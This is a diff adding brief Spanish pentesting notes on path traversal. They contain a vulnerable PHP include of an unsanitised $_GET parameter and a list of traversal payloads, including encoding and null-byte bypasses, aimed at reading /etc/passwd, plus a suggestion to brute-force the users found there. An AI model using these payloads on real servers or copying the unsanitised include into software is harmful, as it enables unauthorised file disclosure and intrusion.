@@ -1,1 +1,19 @@
+Path Traversal es una vulnerabilidad que permite acceder a archivos y directorios fuera del directorio raíz de la aplicación web.
+Esto puede llevar a la exposición de archivos sensibles del servidor, como /etc/passwd o archivos de configuración.
 
+<?php
+  $file = $_GET['file'];
+  include("files/" . $file);
+?>
+
+En url que visitamos podríamos ver algo como ?filename= o ?file= e intentar introducir los siguientes valores:
+
+/etc/passwd
+../../../../../../etc/passwd
+....//....//..../(....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png >> Utilización de un null byte
+
+Si la web fuera vulnerable a directory traversal, podríamos consultar datos internos del servidor. Si fueramos capaces de visualizar /etc/passwd ya estaríamos
+ganando un vector de entrada pues podríamos listar todos los usuarios que tiene el sistema para por ejemplo probar con un ataque de fuerza bruta.
